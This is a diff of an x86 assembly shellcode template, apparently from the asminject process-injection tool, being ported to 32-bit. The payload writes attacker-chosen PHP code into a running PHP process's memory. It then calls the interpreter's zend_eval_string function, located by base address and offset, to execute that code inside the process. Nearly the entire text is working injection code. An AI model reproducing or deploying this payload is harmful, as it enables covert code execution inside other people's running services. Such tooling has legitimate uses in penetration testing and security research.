@@ -1,57 +1,73 @@
 jmp execute_php_code_main
 
-// FRAGMENT:asminject_copy_bytes.s:FRAGMENT
 
 execute_php_code_main:
 
 	// copy the PHP name and code string to arbitrary read/write memory
-	mov edi, arbitrary_read_write_data_address[eip]
-	lea esi, php_name[eip]
-	push ecx
+	mov edi, [VARIABLE:ARBITRARY_READ_WRITE_DATA_ADDRESS:VARIABLE]
+	# set ESI to the address of the PHP name string
+	call execute_php_code_phpname_get_next
+execute_php_code_phpname_get_next:
+	pop esi
+	add esi, 6
+	jmp execute_php_code_copy_phpname
+
+php_name:
+	.ascii "[VARIABLE:phpname:VARIABLE]\0"
+
+execute_php_code_copy_phpname:
 	mov ecx, [VARIABLE:phpname.length:VARIABLE]
 	add ecx, 2												# null terminator
-	//call asminject_copy_bytes
 	rep movsb
-	pop ecx
-	
-	mov edi, arbitrary_read_write_data_address[eip]
+	mov edi, [VARIABLE:ARBITRARY_READ_WRITE_DATA_ADDRESS:VARIABLE]
 	add edi, 128
-	lea esi, php_code[eip]
+	# set ESI to the address of the PHP code string
+	call execute_php_code_phpcode_get_next
+execute_php_code_phpcode_get_next:
+	pop esi
+	add esi, 6
+	jmp execute_php_code_copy_phpcode
+
+php_code:
+	.ascii "[VARIABLE:phpcode:VARIABLE]\0"
+
+execute_php_code_copy_phpcode:
 	push ecx
 	mov ecx, [VARIABLE:phpcode.length:VARIABLE]
 	add ecx, 2												# null terminator
-	// call asminject_copy_bytes
 	rep movsb
 	pop ecx
 	// END: copy the PHP name and code string to arbitrary read/write memory
 	
 	// BEGIN: call zend_eval_string("arbitrary PHP code here")
-	push r10
 	push edx
-	//even though ebx is not used here, if the push/pop for it isn't present, the target process will segfault on my system
+	push ecx
 	push ebx
 	push eax
+	
+	sub esp, 0x4
 	// arbitrary name
-	mov eax, arbitrary_read_write_data_address[eip]
-	mov edx, eax
-	xor esi, esi				# return value pointer
+	mov eax, [VARIABLE:ARBITRARY_READ_WRITE_DATA_ADDRESS:VARIABLE]
+	push eax
+	push 0x0
 	// # PHP code
-	mov eax, arbitrary_read_write_data_address[eip]
+	mov eax, [VARIABLE:ARBITRARY_READ_WRITE_DATA_ADDRESS:VARIABLE]
 	add eax, 128
-	mov edi, eax
-	mov r10, [BASEADDRESS:.+/php[0-9\.]+$:BASEADDRESS] + [RELATIVEOFFSET:^zend_eval_string$:RELATIVEOFFSET]
-	call r10
+	push eax
+	mov edx, [BASEADDRESS:.+/php($|[0-9\.]+$):BASEADDRESS]
+	add edx, [RELATIVEOFFSET:^zend_eval_string$:RELATIVEOFFSET]
+	call edx
+
+	add esp, 0x10
 	pop eax
 	pop ebx
+	pop ecx
 	pop edx
-	pop r10
 	// END: call zend_eval_string("arbitrary PHP code here")
 
 SHELLCODE_SECTION_DELIMITER
 	
-php_code:
-	.ascii "[VARIABLE:phpcode:VARIABLE]\0"
 
-php_name:
-	.ascii "[VARIABLE:phpname:VARIABLE]\0"
+
+
 
